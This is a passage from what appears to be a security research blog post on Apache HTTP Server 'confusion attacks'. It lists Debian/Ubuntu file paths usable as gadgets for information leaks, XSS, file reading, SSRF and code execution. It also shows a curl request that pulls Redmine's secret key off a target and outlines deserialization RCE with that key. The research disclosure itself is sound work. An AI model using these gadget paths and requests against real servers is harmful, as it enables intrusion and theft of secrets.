&lt;p&gt;Technically, the server does check if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; exists, but Apache HTTP Serverâ€™s built-in access control blocks our access. Hereâ€™s a snippet from Apache HTTP Serverâ€™s &lt;a href=&quot;https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115&quot;&gt;configuration template&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Youâ€™ll notice it defaults to blocking access to the root directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt;). So our â€œarbitrary file accessâ€ ability seems a bit less â€œany.â€ Does that mean the showâ€™s over? Not really! We have already broken the trust of only-allowed-access to the DocumentRoot, itâ€™s a significant step forward!&lt;/p&gt;

&lt;p&gt;A closer inspection of different Httpd distributions reveals that &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165&quot;&gt;Debian/Ubuntu&lt;/a&gt; operating systems by default allow &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /usr/share&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; granted
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, the next step is to â€œsqueezeâ€ all possibilities within this directory. All available resources, such as existing tutorials, documentation, unit test files, and even programming languages like PHP, Python, and even PHP modules could become targets for our abuse!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. Of course, the exploitation here is based on the Httpd distributed by Ubuntu/Debian operating systems. However, in practice, we have also found that some applications remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt; line from the root directory, allowing direct access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-2-2-1-local-gadget-to-information-disclosure&quot;&gt;âœ”ï¸ 2-2-1. Local Gadget to Information Disclosure&lt;/h5&gt;

&lt;p&gt;Letâ€™s hunt for potentially exploitable files in this directory. First off, if the target Apache HTTP Server has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;websocketd&lt;/code&gt; service installed, the default package includes an example PHP script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dump-env.php&lt;/code&gt; under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/doc/websocketd/examples/php/&lt;/code&gt;. If thereâ€™s a PHP environment on the target server, this script can be accessed directly to leak sensitive environment variables.&lt;/p&gt;

&lt;p&gt;Additionally, if the target has services like Nginx or Jetty installed, though &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; is theoretically a read-only copy for package installation, these services still place their default Web Roots under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;, making it possible to leak sensitive web application information, such as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; in Jetty.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/nginx/html/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/etc/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/webapps/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Hereâ€™s a simple demonstration using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setup.php&lt;/code&gt; from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Davical&lt;/code&gt; package, which exists as a read-only copy, to leak contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-2-2-2-local-gadget-to-xss&quot;&gt;âœ”ï¸ 2-2-2. Local Gadget to XSS&lt;/h5&gt;

&lt;p&gt;Next, how to turn this primitive into XSS? On the Ubuntu Desktop environment, LibreOffice, an open-source office suite, is installed by default. We can leverage the language switch feature in the help files to achieve XSS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /usr/share/libreoffice/help/help.html&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// the URL came from LibreOffice help (F1)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getParameterByName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/index.html?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;latest/index.html&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thus, even if the target hasnâ€™t deployed any web application, we can still create XSS using an unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; through files that come within the operating system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-2-2-3-local-gadget-to-lfi&quot;&gt;âœ”ï¸ 2-2-3. Local Gadget to LFI&lt;/h5&gt;

&lt;p&gt;What about arbitrary file reading? If the target server has PHP or frontend packages installed, like JpGraph, jQuery-jFeed, or even WordPress or Moodle plugins, their tutorials or debug consoles can become our gadgets, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php&lt;/li&gt;
  &lt;li&gt;/usr/share/javascript/jquery-jfeed/proxy.php&lt;/li&gt;
  &lt;li&gt;/usr/share/moodle/mod/assignment/type/wims/getcsv.php&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Hereâ€™s a simple example exploiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxy.php&lt;/code&gt; from jQuery-jFeed to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-2-2-4-local-gadget-to-ssrf&quot;&gt;âœ”ï¸ 2-2-4. Local Gadget to SSRF&lt;/h5&gt;

&lt;p&gt;Finding an SSRF vulnerability is also a piece of cake, for instance, MagpieRSS offers a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magpie_debug.php&lt;/code&gt; file, which is fabulous gadget for exploiting:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/php/magpierss/scripts/magpie_debug.php&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;ï¸-2-2-5-local-gadget-to-rce&quot;&gt;âœ”ï¸ 2-2-5. Local Gadget to RCE&lt;/h5&gt;

&lt;p&gt;So, can we achieve RCE? Hold on, letâ€™s take it step by step! First, This primitive can reapply all known existing attacks again, like an old version of PHPUnit left behind by development or third-party dependencies, can be directly exploited using &lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841&quot;&gt;CVE-2017-9841&lt;/a&gt; to execute arbitrary code. Or phpLiteAdmin installed with a read-only copy, which by default has the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;. By now, you should see the vast potential of Local Gadgets Manipulation. What remains is to discover even more powerful and universal gadgets!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;âš”ï¸ Primitive 2-3. Jailbreak from Local Gadgets&lt;/h4&gt;

&lt;p&gt;You might ask: â€œCanâ€™t we really break out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;?â€ Of course, we can, that brings out our third primitive â€” &lt;strong&gt;Jailbreak from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;In &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160&quot;&gt;Debian/Ubuntu&lt;/a&gt; distributions of Httpd, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FollowSymLinks&lt;/code&gt; option is explicitly enabled by default. Even in non-Debian/Ubuntu versions, Apache HTTP Server also &lt;a href=&quot;https://httpd.apache.org/docs/current/mod/core.html#options&quot;&gt;implicitly allows Symbolic Links&lt;/a&gt; by default.&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Options&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;FollowSymLinks&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;ï¸-2-3-1-jailbreak-from-local-gadgets&quot;&gt;âœ”ï¸ 2-3-1. Jailbreak from Local Gadgets&lt;/h5&gt;

&lt;p&gt;So, any package that has a Symbolic Link in its installation directory pointing outside of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; can become a stepping-stone to access more gadgets for further exploitation. Here are some useful Symbolic Links weâ€™ve discovered so far:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Cacti Log&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/cacti/site/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/cacti/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Data&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/data/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/solr/data&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/conf/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/solr/conf/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MediaWiki Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/mediawiki/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/mediawiki/config/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SimpleSAMLphp Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/simplesamlphp/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/simplesamlphp/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;ï¸-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;âœ”ï¸ 2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/h5&gt;

&lt;p&gt;To wrap up our jailbreak primitive, letâ€™s showcase how to perform an RCE using a double-hop Symbolic Link in Redmine. In the default installation of Redmine, thereâ€™s an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;instances/&lt;/code&gt; folder pointing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt;, and within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;default/config/&lt;/code&gt; folder points to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/redmine/default/&lt;/code&gt; directory, which holds Redmineâ€™s database setting and secret key.&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /usr/share/redmine/instances/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /var/lib/redmine/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /var/lib/redmine/config/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /etc/redmine/default/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /etc/redmine/default/
 database.yml    secret_key.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thus, through an insecure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; and two Symbolic Links, we can easily access the application secret key used by Redmine:&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f
 HTTP/1.1 200 OK
 Server: Apache/2.4.59 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
 ...
 6d222c3c3a1881c865428edb79a74405
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And since Redmine is a Ruby on Rails application, the content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_key.txt&lt;/code&gt; is actually the key used for signing and encrypting. The next step should be familiar to those who have attacked RoR before: by embedding malicious Marshal objects, signed and encrypted with the known keys, into cookies, and then achieving remote code execution through Server-Side Deserialization!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-3-handler-confusion&quot;&gt;ğŸ”¥ 3. Handler Confusion&lt;/h3&gt;

&lt;p&gt;The final attack Iâ€™m going to introduce is the confusion based on Handler. This attack also leverages a piece of technical debt that has been left over from the legacy architecture of Apache HTTP Server. Letâ€™s quickly understand this technical debt through an example â€” if today you want to run the classic &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; on Apache HTTP Server, which of the following two directives do you use?&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; application/x-httpd-php .php
&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt;    application/x-httpd-php .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The answer is â€” both can correctly get PHP running! Here are the two directive syntaxes, and you can see that not only are the usages similar, but even the effects are exactly the same. Why did Apache HTTP Server initially design two different directives doing the same thing?&lt;/p&gt;

&lt;div class=&quot;language-config highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AddHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;span class=&quot;n&quot;&gt;AddType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;media&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Actually, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; represent different fields within Httpdâ€™s internal structure, corresponding to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt;, respectively. The fact that &lt;strong&gt;users can use them interchangeably without realizing it is thanks to a piece of code that has been in Apache HTTP Server since &lt;a href=&quot;https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c&quot;&gt;its early development in 1996&lt;/a&gt;&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420&quot;&gt;server/config.c#L420&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_CORE_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ap_strchr_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
